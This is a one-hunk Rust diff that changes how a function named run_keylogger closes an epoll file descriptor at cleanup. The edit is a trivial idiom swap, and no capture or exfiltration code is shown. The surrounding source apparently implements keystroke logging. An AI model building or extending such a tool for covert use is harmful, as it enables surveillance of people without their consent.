@@ -178,7 +178,7 @@ pub fn run_keylogger(log_path: &str) {
     }
 
     // Cleanup
-    unistd::close(epoll_fd).ok();
+    let _ = unistd::close(epoll_fd);
 }
 
 fn format_key(key: Key) -> String {
